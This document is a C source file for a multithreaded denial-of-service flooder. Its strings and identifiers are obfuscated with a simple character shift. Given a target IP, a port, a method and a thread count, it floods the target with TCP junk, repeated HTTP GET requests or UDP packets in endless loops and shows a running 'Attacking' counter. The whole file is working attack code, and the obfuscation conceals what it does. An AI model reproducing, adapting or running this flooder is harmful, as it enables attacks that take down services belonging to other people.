#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <errno.h>
#define A1 100
#define B2 1024
#define C3 3
#define D4(x)(x-1)
char*E5(const char*f6){static char g7[B2];int h8;for(h8=0;f6[h8]!='\0';h8++){g7[h8]=f6[h8]-1;}g7[h8]='\0';return g7;}
void i9(const char*j0){printf("%s",E5(j0));}
typedef struct{char*k1;int l2;int m3;char*n4;}o5;
int p6=0;
void*q7(void*r8){o5*s9=(o5*)r8;char t0[B2];int u1;struct sockaddr_in v2;while(1){u1=socket(AF_INET,SOCK_STREAM,0);if(u1==-1){perror(E5("Dpse!opu!dsfbuf!tpdlfu"));sleep(1);continue;}
v2.sin_addr.s_addr=inet_addr(s9->k1);v2.sin_family=AF_INET;v2.sin_port=htons(s9->l2);if(connect(u1,(struct sockaddr*)&v2,sizeof(v2))<0){perror(E5("Dpoofdu!gbjmfe"));close(u1);sleep(1);continue;}
while(1){if(send(u1,t0,B2,0)<0){perror(E5("Tfou!gbjmfe"));break;}p6++;}close(u1);}return NULL;}
void*w3(void*x4){o5*y5=(o5*)x4;char z6[B2];int a7;struct sockaddr_in b8;snprintf(z6,B2,E5("HFU!.!IUUQ;2;2\r\nIptu;!%t\r\n\r\n"),y5->k1);while(1){a7=socket(AF_INET,SOCK_STREAM,0);if(a7==-1){perror(E5("Dpse!opu!dsfbuf!tpdlfu"));sleep(1);continue;}
b8.sin_addr.s_addr=inet_addr(y5->k1);b8.sin_family=AF_INET;b8.sin_port=htons(y5->l2);if(connect(a7,(struct sockaddr*)&b8,sizeof(b8))<0){perror(E5("Dpoofdu!gbjmfe"));close(a7);sleep(1);continue;}
while(1){if(send(a7,z6,strlen(z6),0)<0){perror(E5("Tfou!gbjmfe"));break;}p6++;}close(a7);}return NULL;}
void*c9(void*d0){o5*e1=(o5*)d0;char f2[B2];int g3;struct sockaddr_in h4;int i5=0;g3=socket(AF_INET,SOCK_DGRAM,0);if(g3==-1){perror(E5("Dpse!opu!dsfbuf!tpdlfu"));return NULL;}
h4.sin_addr.s_addr=inet_addr(e1->k1);h4.sin_family=AF_INET;h4.sin_port=htons(e1->l2);while(1){if(sendto(g3,f2,B2,0,(struct sockaddr*)&h4,sizeof(h4))<0){perror(E5("Tfouup!gbjmfe"));i5++;if(i5>=C3){break;}sleep(1);}else{p6++;i5=0;}}close(g3);return NULL;}
int main(int argc,char*argv[]){if(argc<5){i9("Vtbhf;!%t!<ubshfu>!<ubshfu>!<nfuipe>!<uisfbet>\n");i9("Nfuipe;!udq-!iuuq-!vep\n");return 1;}
char*j6=argv[1];int k7=atoi(argv[2]);char*l8=argv[3];int m9=atoi(argv[4]);if(m9>A1){i9("Upp!nboz!uisfbet-!nby!jt!211\n");return 1;}
pthread_t n0[A1];o5 o1[A1];i9("Tubsujoh!%t!gmppe!xjui!%e!uisfbet!up!%t;%e\n");printf("%s %d %s:%d\n",l8,m9,j6,k7);for(int p2=0;p2<m9;p2++){o1[p2].k1=j6;o1[p2].l2=k7;o1[p2].m3=p2;o1[p2].n4=l8;if(strcmp(l8,E5("udq"))==0){if(pthread_create(&n0[p2],NULL,q7,(void*)&o1[p2])!=0){perror(E5("Gbjmfe!up!dsfbuf!uisfbe"));return 1;}}else if(strcmp(l8,E5("iuuq"))==0){if(pthread_create(&n0[p2],NULL,w3,(void*)&o1[p2])!=0){perror(E5("Gbjmfe!up!dsfbuf!uisfbe"));return 1;}}else if(strcmp(l8,E5("vep"))==0){if(pthread_create(&n0[p2],NULL,c9,(void*)&o1[p2])!=0){perror(E5("Gbjmfe!up!dsfbuf!uisfbe"));return 1;}}else{i9("Volfoxo!nfuipe;!%t\n");return 1;}}
while(1){printf("\r\033[32mAttacking\033[0m | [ \033[31m%d\033[0m ]",p6);fflush(stdout);sleep(1);}
for(int p2=0;p2<m9;p2++){pthread_join(n0[p2],NULL);}return 0;}